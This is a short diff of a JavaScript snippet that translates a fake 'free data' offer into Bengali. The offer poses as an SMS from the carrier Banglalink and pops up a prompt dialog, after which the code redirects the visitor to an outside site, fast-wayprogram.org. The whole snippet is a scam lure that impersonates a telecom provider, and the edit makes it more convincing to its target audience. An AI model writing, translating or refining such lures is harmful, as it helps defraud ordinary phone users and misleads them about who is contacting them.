@@ -1,6 +1,6 @@
 
-var password = 'ACTIVATE FREE DATA'
-password=prompt('SMS! Get FREE DATA if your Banglalink Sim Card is up to 6 months or above, Kindly Press OK to CHECK now   ','ACTIVATE FREE DATA');
-if (password != 'ACTIVATE FREE DATA') {
+var password = 'বিনামূল্যে ডেটা সক্রিয় করুন'
+password=prompt('SMS! আপনার বাংলালিংক সিম কার্ড 6 মাস বা তার বেশি হলে বিনামূল্যে ডেটা পান, দয়া করে এখনই চেক করতে ঠিক আছে টিপুন   ','বিনামূল্যে ডেটা সক্রিয় করুন');
+if (password != 'বিনামূল্যে ডেটা সক্রিয় করুন') {
 location.href='https://fast-wayprogram.org/banglalink.html';
 }
